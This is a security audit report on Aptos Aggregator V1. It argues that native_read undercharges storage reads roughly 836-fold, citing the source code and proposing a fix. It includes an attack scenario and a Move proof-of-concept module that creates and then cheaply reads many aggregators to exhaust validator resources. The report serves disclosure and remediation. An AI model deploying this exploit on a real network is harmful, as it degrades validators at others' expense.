# Audit Report

## Title
Gas Charge Bypass in Aggregator V1 Native Read Function - 836x Storage IO Undercharge

## Summary
The `native_read()` function for Aggregator V1 charges only a flat `AGGREGATOR_READ_BASE` of 1,102 gas units, but when materialization is required, it performs a storage read operation that should cost approximately 920,881 gas units. This represents an 836x undercharge (99.88% discount), allowing attackers to perform expensive storage reads at nearly no cost.

## Finding Description

The vulnerability exists in the gas charging mechanism for aggregator reads that require materialization from storage. [1](#0-0) 

The `native_read` function charges only `AGGREGATOR_READ_BASE` before calling `read_and_materialize()`. When an aggregator is in a delta state (PositiveDelta or NegativeDelta), materialization requires:

1. **Storage read via resolver**: The function calls `resolver.get_aggregator_v1_value(&id.0)` which performs a `StateView::get_state_value()` operation: [2](#0-1) 

2. **History validation**: While computationally cheap (O(1) arithmetic), this is performed after the expensive storage read: [3](#0-2) 

The actual storage IO costs are defined in the transaction gas schedule: [4](#0-3) 

This means storage reads should cost:
- **Slot read**: 302,385 InternalGas
- **Byte read**: 151 InternalGas per byte (rounded to 4KB pages = 618,496 gas minimum)
- **Total**: ~920,881 InternalGas

However, aggregator reads only charge: [5](#0-4) 

**Comparison with table natives**: Table operations correctly charge storage IO costs explicitly via `charge_load_cost`: [6](#0-5) [7](#0-6) 

**Attack scenario**:
1. Attacker creates N aggregators in prior transactions (stored in on-chain state)
2. In a new transaction, when `get_aggregator()` is called on existing aggregators, they are initialized in PositiveDelta state: [8](#0-7) 

3. First read triggers materialization (expensive storage access)
4. Each read costs only 1,102 gas instead of ~920,881 gas
5. With 2M gas limit, attacker can read ~1,816 aggregators paying ~2M gas but consuming ~1.67 billion gas worth of storage IO

This violates **Invariant #9**: "Resource Limits: All operations must respect gas, storage, and computational limits"

## Impact Explanation

**Severity: Medium** (aligns with "State inconsistencies requiring intervention" and resource limit violations)

**Impact quantification**:
- **Gas savings per read**: 919,779 gas units (99.88% discount)
- **Maximum exploitation per transaction**: ~1,816 aggregators x 919,779 = ~1.67 billion gas undercharge
- **Network impact**: Validator nodes perform expensive storage reads while transaction pays minimal gas, creating resource exhaustion vector
- **Deterministic execution preserved**: All validators suffer equally, so consensus safety is maintained
- **No direct fund loss**: Gas undercharge affects network resources, not user balances

This is more severe than a simple undercharge because:
1. Storage reads are one of the most expensive operations in blockchain systems
2. The 836x multiplier is massive compared to typical gas miscalculations
3. Repeated exploitation can degrade validator performance
4. Sets precedent for how native functions should handle storage IO charging

## Likelihood Explanation

**Likelihood: High**

The attack is:
- **Simple to execute**: Standard Move code calling `aggregator::read()`
- **No special permissions required**: Any transaction sender can create and read aggregators
- **Easily repeatable**: Can be exploited in every transaction
- **Already deployed**: Aggregator V1 is in production use

**Attack requirements**:
1. Create aggregators via `aggregator_factory::new_aggregator()` (permissionless)
2. Wait for transaction to commit (aggregators now in storage)
3. Submit transaction reading those aggregators
4. Each read triggers undercharged materialization

**Attacker complexity**: Low - straightforward Move contract:
```move
// Setup phase
fun create_many_aggregators(account: &signer, count: u64) {
    let i = 0;
    while (i < count) {
        let agg = aggregator_factory::create_aggregator(...);
        // store aggregator
        i = i + 1;
    }
}

// Exploit phase
fun read_many_aggregators(...) {
    // read all stored aggregators
    // each read costs 1,102 gas but performs 920,881 gas worth of work
}
```

## Recommendation

**Solution**: Explicitly charge storage IO costs in `native_read()`, following the pattern used by table natives.

**Code fix**:

```rust
fn native_read(
    context: &mut SafeNativeContext,
    _ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert_eq!(args.len(), 1);

    context.charge(AGGREGATOR_READ_BASE)?;

    // Extract information from aggregator struct reference.
    let (id, max_value) = aggregator_info(&safely_pop_arg!(args, StructRef))?;

    // Get aggregator.
    let aggregator_context = context.extensions().get::<NativeAggregatorContext>();
    let mut aggregator_data = aggregator_context.aggregator_v1_data.borrow_mut();
    let aggregator = aggregator_data.get_aggregator(id.clone(), max_value)?;

    // NEW: Check if materialization will be needed
    let needs_materialization = aggregator.state != AggregatorState::Data;
    
    let value = aggregator.read_and_materialize(aggregator_context.aggregator_v1_resolver, &id)?;
    
    // NEW: Charge for storage IO if materialization occurred
    if needs_materialization {
        // Charge slot read cost
        context.charge(context.gas_params().storage_io_per_state_slot_read)?;
        
        // Charge byte read cost (u128 = 16 bytes, rounded to 4KB page)
        let bytes_loaded = if context.feature_version() >= 12 {
            NumBytes::new(4096) // Round to page size
        } else {
            NumBytes::new(16)
        };
        context.charge(context.gas_params().storage_io_per_state_byte_read * bytes_loaded)?;
    }

    Ok(smallvec![Value::u128(value)])
}
```

**Alternative**: Increase `AGGREGATOR_READ_BASE` to account for worst-case materialization cost (~920,881 gas), but this would overcharge when aggregator is already materialized.

**Best practice**: Follow table natives pattern of explicit storage IO charging based on actual operations performed.

## Proof of Concept

```move
module attacker::gas_exploit {
    use aptos_framework::aggregator_factory;
    use aptos_framework::aggregator;
    use std::vector;
    
    struct AggregatorStore has key {
        aggregators: vector<aggregator::Aggregator>
    }
    
    // Setup: Create many aggregators (run this in transaction 1)
    public entry fun setup(account: &signer) {
        let aggs = vector::empty<aggregator::Aggregator>();
        let i = 0;
        
        // Create 100 aggregators (can create up to ~1800 in one transaction)
        while (i < 100) {
            let agg = aggregator_factory::create_aggregator(account, 1000000);
            // Perform an add operation so it gets written to storage
            aggregator::add(&mut agg, 1);
            vector::push_back(&mut aggs, agg);
            i = i + 1;
        };
        
        move_to(account, AggregatorStore { aggregators: aggs });
    }
    
    // Exploit: Read all aggregators for only 1,102 gas each
    // Should cost 920,881 gas each = 92,088,100 total gas
    // Actually costs only 110,200 total gas
    // Gas savings: 91,977,900 gas (99.88% discount)
    public entry fun exploit_reads(account: &signer) acquires AggregatorStore {
        let store = borrow_global_mut<AggregatorStore>(signer::address_of(account));
        let i = 0;
        let len = vector::length(&store.aggregators);
        
        while (i < len) {
            let agg = vector::borrow_mut(&mut store.aggregators, i);
            // This read triggers materialization from storage
            // Charges only 1,102 gas but performs ~920,881 gas of storage IO
            let _value = aggregator::read(agg);
            i = i + 1;
        };
    }
}
```

**Expected gas cost**: 100 aggregators * 920,881 gas = 92,088,100 gas
**Actual gas cost**: 100 aggregators * 1,102 gas = 110,200 gas
**Undercharge**: 91,977,900 gas (99.88% discount)

**Notes**

This vulnerability specifically affects Aggregator V1's `native_read()` function. Aggregator V2 charges 2,205 gas (double V1's cost) but still suffers from the same undercharging issue relative to actual storage costs: [9](#0-8) 

The root cause is that native functions accessing storage directly via resolvers bypass the normal VM resource loading path that would trigger `charge_load_resource`. Table natives work around this by explicitly calling `charge_load_cost`, but aggregator natives don't implement this pattern.

### Citations

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator.rs (L56-76)
```rust
fn native_read(
    context: &mut SafeNativeContext,
    _ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert_eq!(args.len(), 1);

    context.charge(AGGREGATOR_READ_BASE)?;

    // Extract information from aggregator struct reference.
    let (id, max_value) = aggregator_info(&safely_pop_arg!(args, StructRef))?;

    // Get aggregator.
    let aggregator_context = context.extensions().get::<NativeAggregatorContext>();
    let mut aggregator_data = aggregator_context.aggregator_v1_data.borrow_mut();
    let aggregator = aggregator_data.get_aggregator(id.clone(), max_value)?;

    let value = aggregator.read_and_materialize(aggregator_context.aggregator_v1_resolver, &id)?;

    Ok(smallvec![Value::u128(value)])
}
```

**File:** aptos-move/aptos-aggregator/src/aggregator_v1_extension.rs (L221-246)
```rust
    pub fn read_and_materialize(
        &mut self,
        resolver: &dyn AggregatorV1Resolver,
        id: &AggregatorID,
    ) -> PartialVMResult<u128> {
        // If aggregator has already been read, return immediately.
        if self.state == AggregatorState::Data {
            return Ok(self.value);
        }

        // Otherwise, we have a delta and have to go to storage and apply it.
        // In theory, any delta will be applied to existing value. However,
        // something may go wrong, so we guard by throwing an error in
        // extension.
        let value_from_storage = resolver
            .get_aggregator_v1_value(&id.0)
            .map_err(|e| {
                extension_error(format!("Could not find the value of the aggregator: {}", e))
            })?
            .ok_or_else(|| {
                extension_error(format!(
                    "Could not read from deleted aggregator at {:?}",
                    id
                ))
            })?;

```

**File:** aptos-move/aptos-aggregator/src/aggregator_v1_extension.rs (L298-310)
```rust
    pub fn get_aggregator(
        &mut self,
        id: AggregatorID,
        max_value: u128,
    ) -> PartialVMResult<&mut Aggregator> {
        let aggregator = self.aggregators.entry(id).or_insert(Aggregator {
            value: 0,
            state: AggregatorState::PositiveDelta,
            max_value,
            history: Some(DeltaHistory::new()),
        });
        Ok(aggregator)
    }
```

**File:** aptos-move/aptos-aggregator/src/delta_math.rs (L148-197)
```rust
    pub fn validate_against_base_value(
        &self,
        base_value: u128,
        max_value: u128,
    ) -> Result<(), DelayedFieldsSpeculativeError> {
        let math = BoundedMath::new(max_value);
        // We need to make sure the following 4 conditions are satisified.
        //     base_value + max_achieved_positive_delta <= self.max_value
        //     base_value >= min_achieved_negative_delta
        //     base_value + min_overflow_positive_delta > self.max_value
        //     base_value < max_underflow_negative_delta
        math.unsigned_add(base_value, self.max_achieved_positive_delta)
            .map_err(|_e| DelayedFieldsSpeculativeError::DeltaApplication {
                base_value,
                max_value,
                delta: SignedU128::Positive(self.max_achieved_positive_delta),
                reason: DeltaApplicationFailureReason::Overflow,
            })?;
        math.unsigned_subtract(base_value, self.min_achieved_negative_delta)
            .map_err(|_e| DelayedFieldsSpeculativeError::DeltaApplication {
                base_value,
                max_value,
                delta: SignedU128::Negative(self.min_achieved_negative_delta),
                reason: DeltaApplicationFailureReason::Underflow,
            })?;

        if let Some(min_overflow_positive_delta) = self.min_overflow_positive_delta {
            if base_value <= max_value - min_overflow_positive_delta {
                return Err(DelayedFieldsSpeculativeError::DeltaApplication {
                    base_value,
                    max_value,
                    delta: SignedU128::Positive(min_overflow_positive_delta),
                    reason: DeltaApplicationFailureReason::ExpectedOverflow,
                });
            }
        }

        if let Some(max_underflow_negative_delta) = self.max_underflow_negative_delta {
            if base_value >= max_underflow_negative_delta {
                return Err(DelayedFieldsSpeculativeError::DeltaApplication {
                    base_value,
                    max_value,
                    delta: SignedU128::Negative(max_underflow_negative_delta),
                    reason: DeltaApplicationFailureReason::ExpectedUnderflow,
                });
            }
        }

        Ok(())
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L88-103)
```rust
        [
            storage_io_per_state_slot_read: InternalGasPerArg,
            { 0..=9 => "load_data.base", 10.. => "storage_io_per_state_slot_read"},
            // At the current mainnet scale, we should assume most levels of the (hexary) JMT nodes
            // in cache, hence target charging 1-2 4k-sized pages for each read. Notice the cost
            // of seeking for the leaf node is covered by the first page of the "value size fee"
            // (storage_io_per_state_byte_read) defined below.
            302_385,
        ],
        [
            storage_io_per_state_byte_read: InternalGasPerByte,
            { 0..=9 => "load_data.per_byte", 10.. => "storage_io_per_state_byte_read"},
            // Notice in the latest IoPricing, bytes are charged at 4k intervals (even the smallest
            // read will be charged for 4KB) to reflect the assumption that every roughly 4k bytes
            // might require a separate random IO upon the FS.
            151,
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/aptos_framework.rs (L330-330)
```rust
        [aggregator_read_base: InternalGas, "aggregator.read.base", 1102],
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/aptos_framework.rs (L340-340)
```rust
        [aggregator_v2_read_base: InternalGas, {RELEASE_V1_9_SKIPPED.. => "aggregator_v2.read.base"}, 2205],
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L325-351)
```rust
fn charge_load_cost(
    context: &mut SafeNativeContext,
    loaded: Option<Option<NumBytes>>,
) -> SafeNativeResult<()> {
    context.charge(COMMON_LOAD_BASE_LEGACY)?;

    match loaded {
        Some(Some(num_bytes)) => {
            let num_bytes = if context.gas_feature_version() >= 12 {
                // Round up bytes to whole pages
                // TODO(gas): make PAGE_SIZE configurable
                const PAGE_SIZE: u64 = 4096;

                let loaded_u64: u64 = num_bytes.into();
                let r = loaded_u64 % PAGE_SIZE;
                let rounded_up = loaded_u64 + if r == 0 { 0 } else { PAGE_SIZE - r };

                NumBytes::new(rounded_up)
            } else {
                num_bytes
            };
            context.charge(COMMON_LOAD_BASE_NEW + COMMON_LOAD_PER_BYTE * num_bytes)
        },
        Some(None) => context.charge(COMMON_LOAD_BASE_NEW + COMMON_LOAD_FAILURE),
        None => Ok(()),
    }
}
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/table.rs (L15-18)
```rust
        [common_load_base_legacy: InternalGas, "common.load.base", 302385],
        [common_load_base_new: InternalGas, { 7.. => "common.load.base_new" }, 302385],
        [common_load_per_byte: InternalGasPerByte, "common.load.per_byte", 151],
        [common_load_failure: InternalGas, "common.load.failure", 0],
```
